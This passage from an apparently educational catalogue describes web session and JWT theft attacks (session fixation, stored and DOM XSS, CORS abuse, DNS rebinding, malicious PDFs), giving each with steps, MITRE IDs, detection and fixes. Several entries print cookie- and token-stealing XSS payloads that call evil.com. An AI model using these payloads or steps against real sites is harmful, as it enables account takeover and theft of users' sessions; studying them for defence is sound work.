- **Attack Steps**: 1. The attacker registers on the web application and logs in, obtaining a session cookie. 2. They note that the session persists even after clicking “Logout” due to improper cookie invalidation. 3. They share a link with the victim that contains the attacker's session ID embedded in a URL or browser cookie. 4. When the victim clicks and logs in, the session ID remains unchanged and becomes linked to the victim’s account. 5. The attacker now has the same active session from a different device. 6. Since the app doesn't invalidate or regenerate sessions on logout/login, this allows fixation. 7. The attacker can perform actions on behalf of the user without triggering detection. 8. This highlights poor session lifecycle management and fixation risk.
- **Detection**: Log multiple IPs under same session
- **Solution**: Regenerate session IDs on every login
- **Tags**: #sessionfixation #cookiepersist #authflaw

## JWT Theft via React DevTools Leak in Browser

- **Attack Type**: LocalStorage Token Leak
- **Target**: SPAs using React and localStorage
- **Vulnerability**: Storing tokens in UI props/state
- **MITRE**: T1552.001
- **Impact**: Token theft via dev state exposure
- **Tools**: React DevTools, Chrome
- **Scenario**: JWT is accidentally exposed in memory via React DevTools in production
- **Attack Steps**: 1. A developer stores the JWT token in a React state variable or props. 2. This state gets rendered into a component’s debug metadata visible in React DevTools. 3. An attacker tricks the user (or internal staff) into opening DevTools and inspecting the component tree. 4. The attacker asks for a screenshot or copy-paste of component state for “debugging.” 5. The JWT token, stored in plain variables, becomes visible in shared logs or screenshots. 6. The attacker captures the token and replays it in their browser to hijack the user session. 7. No script is needed — this is a logic flaw and social engineering vector. 8. Such exposures can go unnoticed for long if DevTools inspection is common.
- **Detection**: Monitor debugging tools and logs
- **Solution**: Avoid putting secrets in app state
- **Tags**: #jwtleak #reactdevtools #tokeninscope

## Cookie Hijack via Cross-Origin Script Inclusion

- **Attack Type**: Script Injection
- **Target**: Sites using external scripts
- **Vulnerability**: No CSP + 3rd-party script trust
- **MITRE**: T1190
- **Impact**: Session theft across users
- **Tools**: CSP Tester, JSInjector
- **Scenario**: Attacker-controlled script loaded via <script src> reads cookies
- **Attack Steps**: 1. A vulnerable site includes a <script src="https://untrustedsite.com/script.js"> in the HTML. 2. The attacker controls the hosted file and injects code like fetch('https://evil.com?c='+document.cookie). 3. When users load the site, the script executes in page context. 4. Since the script is treated as same-origin, it inherits access to the site's cookies and DOM. 5. The attacker silently collects session data from every visitor. 6. The attack remains persistent until the malicious file is removed or updated. 7. This can happen if devs test code from random CDNs or Gists. 8. Improper CSP policies enable the damage to escalate.
- **Detection**: Monitor 3rd-party JS requests
- **Solution**: Host scripts internally and validate integrity
- **Tags**: #scriptinclusion #cspbypass #cookiesteal

## Session Fixation via Cookie Injection in Wi-Fi Portal

- **Attack Type**: MITM + Fixation
- **Target**: Web users on public Wi-Fi
- **Vulnerability**: Session cookies set via MITM
- **MITRE**: T1557
- **Impact**: Session takeover via passive attack
- **Tools**: mitmproxy, Burp Suite
- **Scenario**: Public Wi-Fi portal injects session cookies before redirecting
- **Attack Steps**: 1. The attacker controls a malicious open Wi-Fi hotspot and sets up a transparent proxy. 2. A victim connects and visits a benign site (e.g., example.com). 3. The proxy intercepts and injects a Set-Cookie header before redirecting. 4. When the victim later logs into their account, the pre-set session ID gets tied to their session. 5. The attacker retains a copy of the injected cookie. 6. They use it to hijack the session without needing credentials. 7. This is possible because of lack of HTTPS or if the site doesn’t enforce HSTS. 8. It’s an offline, real-world attack vector via network control.
- **Detection**: Look for session IDs set pre-login
- **Solution**: Enforce HTTPS and use HSTS
- **Tags**: #mitmfixation #cookieinject #sessionreuse

## Token Exfiltration via Chatbot Integration XSS

- **Attack Type**: Stored XSS
- **Target**: Sites using 3rd-party chat tools
- **Vulnerability**: Unsanitized bot messages
- **MITRE**: T1190
- **Impact**: Escalated session compromise
- **Tools**: XSS Hunter, Burp
- **Scenario**: Chatbot script reflects messages unsanitized, allowing token theft
- **Attack Steps**: 1. A web app uses a 3rd-party chatbot for user support. 2. The attacker sends a support message containing: <script>fetch('https://evil.com?t='+localStorage.token)</script>. 3. The bot interface reflects messages without sanitization. 4. When staff open the chat in their admin panel, the script runs in the browser. 5. It reads localStorage and sends the JWT token to the attacker’s server. 6. The attacker now accesses internal or staff-level sessions. 7. Stored XSS in integrations like chatbots are often overlooked. 8. The breach spans beyond the user into privileged backend systems.
- **Detection**: Sanitize inputs from all integrations
- **Solution**: Review all 3rd-party input surfaces
- **Tags**: #chatxss #tokenexfil #integrationrisk

## Cookie Theft via CSP Report Endpoint Abuse

- **Attack Type**: CSP Misconfiguration
- **Target**: Sites with verbose CSP logging
- **Vulnerability**: Trusting external report URIs
- **MITRE**: T1059.007
- **Impact**: Cookie leakage through logs
- **Tools**: CSP Tester, Headers Viewer
- **Scenario**: CSP report-uri leaks cookies through error payloads
- **Attack Steps**: 1. A site implements CSP and defines report-uri for policy violations. 2. The attacker injects malformed content or XSS that triggers a CSP error. 3. They craft the payload so that the CSP report includes cookie info (e.g., in URL params). 4. The site’s CSP sends the full report to the defined URI — which is attacker-controlled. 5. This allows exfiltrating document.cookie through the CSP logging mechanism. 6. Since it’s a POST request from the browser, it’s hard to detect unless logs are watched. 7. The attacker gains stealthy, indirect cookie access. 8. This can persist unless the report-uri is corrected or disabled.
- **Detection**: Monitor CSP report destinations
- **Solution**: Avoid external CSP logging
- **Tags**: #cspabuse #reportleak #headertrap

## JWT Theft via Compromised Browser Plugin Sync

- **Attack Type**: Browser Extension Abuse
- **Target**: Browser users with synced plugins
- **Vulnerability**: Weak sync protocol + token storage
- **MITRE**: T1546
- **Impact**: Multi-session hijack via plugin leak
- **Tools**: Chrome Sync, Browser Plugin
- **Scenario**: Plugin syncs data to cloud without encryption, exposing tokens
- **Attack Steps**: 1. The user installs a browser plugin that syncs its data (including tokens) to a developer account. 2. The plugin stores JWT tokens for API access in its configuration. 3. Sync happens over insecure HTTP or weakly secured cloud endpoints. 4. The attacker gains access to the developer's sync server or intercepts data mid-transit. 5. All synced tokens, including those from other domains, are now compromised. 6. The attacker uses tokens to gain access to user accounts or APIs. 7. Users are unaware of how deeply their data is tied to the plugin. 8. This threat arises when extensions use custom, unaudited cloud sync services.
- **Detection**: Audit browser plugin permissions
- **Solution**: Avoid plugin-based token storage
- **Tags**: #plugintoken #syncsteal #browserleak

## Cookie Hijack via Mixed Content on Login Page

- **Attack Type**: Mixed Content Leak
- **Target**: HTTPS login pages with mixed assets
- **Vulnerability**: Mixed content inclusion
- **MITRE**: T1557
- **Impact**: Session compromise via MITM
- **Tools**: Chrome DevTools, HTTP Inspector
- **Scenario**: Login page uses HTTPS but loads resources over HTTP
- **Attack Steps**: 1. A site serves the login page over HTTPS but includes scripts or images from HTTP URLs. 2. The attacker performs a MITM attack and injects JavaScript via the unencrypted HTTP channel. 3. The injected script runs with HTTPS privileges and can access session cookies. 4. The script uses document.cookie and fetch() to send the session token to the attacker. 5. Since it’s part of the HTTPS page, browser treats it as trusted. 6. The attack can go unnoticed if mixed content warnings are ignored. 7. This vulnerability bridges secure and insecure channels. 8. It results in full session compromise from a single HTTP element.
- **Detection**: Enforce HTTPS for all assets
- **Solution**: Block mixed content using CSP
- **Tags**: #mixedcontent #cookiemitm #httpasset

## JWT Hijack via Man-in-the-DOM Exploit

- **Attack Type**: DOM Manipulation
- **Target**: SPAs using client-side rendering
- **Vulnerability**: DOM-based XSS vector
- **MITRE**: T1059.007
- **Impact**: Full token hijack via DOM
- **Tools**: XSStrike, Dev Console
- **Scenario**: Malicious JS alters DOM to read and send tokens
- **Attack Steps**: 1. The attacker exploits a DOM-based XSS vulnerability in a SPA framework. 2. They inject code using URL fragment manipulation or an input field that directly affects innerHTML. 3. The code executes inside the same context as the page, accessing localStorage. 4. The script reads localStorage.jwt_token and sends it silently to https://evil.com. 5. DOM-based vectors often bypass server-side filters or WAFs. 6. The payload is triggered client-side, invisible in logs. 7. If token isn't secured or rotated, it grants long-term access. 8. DOM-based XSS is stealthy and dangerous in JWT-heavy apps.
- **Detection**: Use DOMPurify or CSP
- **Solution**: Avoid writing unsanitized input to DOM
- **Tags**: #domxss #jwttheft #clientbug

## Cookie Hijack via Password Reset Page XSS

- **Attack Type**: Stored XSS
- **Target**: Web apps with insecure reset URLs
- **Vulnerability**: Reflected XSS on sensitive flows
- **MITRE**: T1059.007
- **Impact**: Complete session hijack via social engineering
- **Tools**: Burp Suite, XSStrike
- **Scenario**: XSS in password reset message allows attackers to execute JS and steal cookies
- **Attack Steps**: 1. An attacker initiates a password reset on behalf of a target victim. 2. The reset link points to a page like reset.html?msg=Your%20reset%20is%20ready. 3. The attacker injects a payload into the msg parameter: <script>fetch('https://evil.com?c='+document.cookie)</script>. 4. The application reflects this parameter back into the HTML without sanitization. 5. When the victim clicks the reset link, the script executes in their browser. 6. The attacker receives the user's cookies, including authentication session data. 7. With the session cookie, the attacker bypasses login entirely. 8. This attack is effective against users who regularly reset passwords and trust email links.
- **Detection**: Scan reflected params in reset pages
- **Solution**: Encode/sanitize all URL inputs
- **Tags**: #resetxss #cookieleak #sessionbypass

## Token Theft via Malicious QR Code Scanner App

- **Attack Type**: Mobile JS Injection
- **Target**: Mobile browsers/SPAs
- **Vulnerability**: Unsafe DOM injection via QR input
- **MITRE**: T1552.001
- **Impact**: API access through stolen JWT
- **Tools**: QR Code Generator, Burp
- **Scenario**: QR code opens link with JavaScript payload to steal localStorage
- **Attack Steps**: 1. The attacker distributes a QR code that opens a mobile-optimized web app. 2. The link includes a script payload in the query string: <script>fetch('https://evil.com?t='+localStorage.jwt)</script>. 3. The app parses the query directly into the DOM using innerHTML or document.write. 4. On mobile, users scan the QR and land on the page — the payload executes automatically. 5. Their localStorage is accessed, and JWT is exfiltrated to the attacker. 6. Mobile browsers often have minimal dev tools, so detection is rare. 7. The attacker reuses the token to access mobile APIs or user accounts. 8. This blends physical vector (QR code) with DOM XSS and token theft.
- **Detection**: Sanitize all QR-based inputs
- **Solution**: Treat QR input as untrusted
- **Tags**: #qrxss #tokenexfil #mobileapiabuse

## Session Fixation via Login Frame Phishing

- **Attack Type**: Frame-Based Phishing
- **Target**: Web apps that allow framing
- **Vulnerability**: No anti-frame protection + fixed session
- **MITRE**: T1078
- **Impact**: Attacker access post-login
- **Tools**: iframe, Browser DevTools
- **Scenario**: Phishing page frames real login page, preserving victim session for attacker
- **Attack Steps**: 1. The attacker builds a phishing site that embeds the real login page inside an iframe. 2. Before loading, the attacker visits the legitimate login site to create a session (e.g., sessid=attacker123). 3. They set that cookie via header injection or session sharing tools. 4. The phishing frame then loads the real site, but with the fixed session cookie. 5. When the victim logs in, the session remains bound to attacker123. 6. The attacker now has access to the same session without knowing the victim’s password. 7. Since everything looks legitimate, even the domain is hard to distinguish inside the iframe. 8. This form of session fixation blends social engineering with session management flaws.
- **Detection**: Check referrers and frame usage
- **Solution**: Use X-Frame-Options: DENY
- **Tags**: #iframefixation #framesteal #sessionabuse

## JWT Theft via CORS Misconfiguration in Dev Subdomain

- **Attack Type**: CORS Abuse
- **Target**: Dev subdomains with public APIs
- **Vulnerability**: Wildcard CORS + credentials
- **MITRE**: T1190
- **Impact**: Cross-origin token exfiltration
- **Tools**: curl, CORS testing tools
- **Scenario**: Access-Control-Allow-Origin: * leaks JWT from dev subdomain
- **Attack Steps**: 1. A company exposes dev.example.com to the internet with CORS headers set to *. 2. The frontend fetches JWTs from internal APIs using fetch() with credentials. 3. The attacker builds a malicious site that sends a CORS request to dev.example.com/api/me. 4. Due to misconfigured headers (Access-Control-Allow-Credentials: true), the response includes JWT. 5. The attacker's domain receives the response with valid token data. 6. They extract the JWT and replay it against the main example.com app. 7. If the dev and prod environments share JWT secrets, the token is valid. 8. This common CORS misconfig can bypass origin-based access controls.
- **Detection**: Monitor CORS headers on all domains
- **Solution**: Never combine * with credentials
- **Tags**: #corsleak #jwtabuse #originfail

## Cookie Theft via PDF Phishing with Embedded Script

- **Attack Type**: Embedded PDF + JS
- **Target**: PDF viewers in browsers
- **Vulnerability**: JS-enabled PDF execution
- **MITRE**: T1203
- **Impact**: Stealth cookie exfiltration
- **Tools**: Evil-PDF, Adobe Reader
- **Scenario**: Script in malicious PDF triggers cookie-grabbing request
- **Attack Steps**: 1. The attacker crafts a malicious PDF using a JS-capable PDF generator. 2. The script runs automatically when the file is opened in a vulnerable browser or plugin. 3. The script includes code like: fetch('https://evil.com?c='+document.cookie). 4. If the PDF is opened in an in-browser PDF viewer that supports JavaScript, the payload runs. 5. The user’s cookies for that domain are sent to the attacker. 6. Some outdated browsers or extensions still allow this behavior. 7. The attacker now impersonates the user via the stolen session. 8. This exploits weak plugin behavior and poor viewer sandboxing.
- **Detection**: Disable JS in PDF viewers
- **Solution**: Use secure PDF parsers only
- **Tags**: #pdfxss #jsinjection #cookiesteal

## JWT Theft via Open Electron App Debug Mode

- **Attack Type**: Desktop JS App Exploit
- **Target**: Electron or JS desktop apps
- **Vulnerability**: Debug mode + token in localStorage
- **MITRE**: T1552
- **Impact**: API hijack from desktop client
- **Tools**: Electron, Chrome DevTools
- **Scenario**: Electron app runs in debug mode exposing localStorage JWT
- **Attack Steps**: 1. A developer releases a desktop app using Electron but forgets to disable debug mode. 2. The attacker downloads the app and launches it with --remote-debugging-port=9222. 3. This opens a remote debugger endpoint that exposes the app’s internals. 4. The attacker connects to the app via Chrome and reads the localStorage data. 5. JWT tokens used for authentication are stored there. 6. The attacker now uses the token to call APIs or gain access to services used by the user. 7. Since it's a local app, this doesn’t require network exploits. 8. The attack combines local privilege with app misconfiguration.
- **Detection**: Disable remote debugging in prod
- **Solution**: Avoid client-side token storage
- **Tags**: #electronleak #jwtdebug #devtoolsrisk

## Cookie Hijack via DNS Rebinding

- **Attack Type**: DNS Rebinding
- **Target**: Internal apps in private IP range
- **Vulnerability**: DNS rebinding + cookie trust
- **MITRE**: T1071.001
- **Impact**: Bypass SOP to access internal data
- **Tools**: DNSChef, Rebind Toolkit
- **Scenario**: Attacker tricks browser into treating evil site as trusted domain
- **Attack Steps**: 1. The attacker sets up a malicious website that responds to DNS queries with two IPs. 2. The first response points to the attacker's server, loading malicious scripts. 3. The second response (after browser cache expires) points to internal.company.com. 4. Browser thinks it’s still on the attacker’s domain and allows access to cookies and internal APIs. 5. The attacker now has access to internal app cookies and config. 6. This circumvents origin checks and CORS. 7. The attack is executed without any user interaction beyond visiting a site. 8. Effective against internal web tools or routers.
- **Detection**: Monitor DNS anomalies
- **Solution**: Restrict internal domains to trusted IPs only
- **Tags**: #dnsrebind #sopbypass #cookiebreach

## Session Hijack via Shared Browser Auto-Fill

- **Attack Type**: Autofill Abuse
- **Target**: Browser with autofill enabled
- **Vulnerability**: Autofill data exfiltration
- **MITRE**: T1557
- **Impact**: Credential and session theft
- **Tools**: HTML Autofill, Evil Forms
- **Scenario**: User auto-fills login on malicious form that sends session to attacker
- **Attack Steps**: 1. An attacker creates a hidden form with fields named username, password, and session. 2. The user visits the page, and the browser auto-fills previously saved credentials. 3. A JavaScript snippet silently submits the form to the attacker’s endpoint. 4. If the browser auto-filled cookies or session data (stored in input type=hidden), those too are sent. 5. Some browser plugins may save more than just passwords. 6. The attacker receives valid credentials and session IDs. 7. This works especially well when auto-fill is globally enabled. 8. It's a form of passive hijack relying solely on browser behavior.
- **Detection**: Restrict autofill to trusted domains
- **Solution**: Use form metadata restrictions
- **Tags**: #autofillsteal #browserrisk #formexploit

## JWT Leak via Public Error Logs

- **Attack Type**: Misconfigured Logging
- **Target**: Web apps using public error monitoring
- **Vulnerability**: Sensitive tokens in logs
- **MITRE**: T1005
- **Impact**: Passive session hijack
- **Tools**: Sentry, ELK Stack
- **Scenario**: Production error log captures and exposes JWT in URLs or headers
- **Attack Steps**: 1. A frontend web app logs errors to a public logging dashboard. 2. JWTs passed in Authorization headers or query strings get logged on failures. 3. The logging endpoint is exposed without authentication (e.g., for dev debugging). 4. An attacker visits the logging dashboard and sees requests from users with their tokens. 5. They copy a valid JWT and use it to impersonate the user. 6. Tokens in logs can persist for weeks, giving attackers a long window. 7. This happens silently — users have no indication. 8. It’s a major breach vector through misconfigured observability.
- **Detection**: Scrub logs for PII and tokens
- **Solution**: Lock access to monitoring tools
- **Tags**: #logleak #tokeninlogs #observabilityrisk

## Cookie Theft via Unlocked Developer Tools Access

- **Attack Type**: Physical Access Attack
- **Target**: Shared physical devices
- **Vulnerability**: No screen lock + cookie in memory
- **MITRE**: T1056.001
- **Impact**: Offline session hijack
- **Tools**: DevTools, Chrome
- **Scenario**: Attacker accesses dev console on unlocked machine to extract cookie
- **Attack Steps**: 1. A user leaves their workstation unlocked in a public or shared environment. 2. The attacker walks up, opens the browser, and inspects the console. 3. They run document.cookie in the console and view the session token. 4. They email it to themselves or save it to a USB. 5. Later, they use the session cookie to log into the user’s account. 6. No password is needed, and there's no alert on the login. 7. This attack requires only physical access and 30 seconds of time. 8. It’s a major security gap when machines are left unattended.
- **Detection**: Lock screens when away
- **Solution**: Encrypt or invalidate cookies quickly
- **Tags**: #physicalaccess #devtoolssteal #browsercookie

